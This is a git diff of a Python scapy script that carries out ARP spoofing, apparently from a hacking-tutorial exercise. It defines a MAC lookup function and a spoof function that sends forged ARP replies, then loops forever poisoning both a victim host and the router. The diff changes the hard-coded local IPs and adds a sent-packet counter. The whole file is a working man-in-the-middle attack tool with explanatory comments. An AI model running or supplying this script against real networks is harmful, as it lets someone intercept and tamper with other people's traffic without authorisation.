@@ -1,5 +1,6 @@
 import scapy.all as scapy
 import time
+
  
 def getMac(ip):
     arpPacket = scapy.ARP(pdst=ip)#create an arp packet
@@ -10,6 +11,7 @@ def getMac(ip):
     #timeout is for waiting and exiting the function or else it will be stuck in a loop
     #verbose is set to false so the output will be a little clean
     return answeredList[0][1].hwsrc
+
 def spoof(target_ip, spoof_ip):
     target_mac = getMac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
@@ -19,8 +21,12 @@ def spoof(target_ip, spoof_ip):
     #psrc=source ip address meaning where is this packet coming from. WE are gonna set this to router ip.
     scapy.send(packet, verbose=False)
 
-while True: #so that arp spoof stays on     
-	spoof("192.168.64.4", "192.168.64.1")
-	spoof("192.168.64.1", "192.168.64.4")
-	time.sleep(2)
-
+send_packets_count = 0
+while True:
+    spoof("192.168.1.10", "192.168.1.1")
+    spoof("192.168.1.1","192.168.1.10")
+    send_packets_count = send_packets_count + 2
+    print("\r[+] Sent packets " + str(send_packets_count), end="")
+    time.sleep(2)
+    
+    
